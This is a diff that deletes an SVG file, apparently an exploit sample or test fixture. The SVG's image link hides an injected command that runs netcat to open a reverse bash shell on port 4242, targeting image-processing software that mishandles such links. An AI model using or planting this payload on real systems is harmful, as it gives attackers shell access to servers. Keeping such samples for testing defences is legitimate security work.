@@ -1,9 +1,0 @@
-<?xml version="1.0" standalone="no"?>
-<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
-"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
-<svg width="640px" height="480px" version="1.1"
-xmlns="http://www.w3.org/2000/svg" xmlns:xlink=
-"http://www.w3.org/1999/xlink">
-<image xlink:href="https://example.com/image.jpg&quot;|/bin/nc.traditional 127.0.0.1 4242 -e /bin/bash&quot;"
-x="0" y="0" height="640px" width="480px"/>
-</svg>
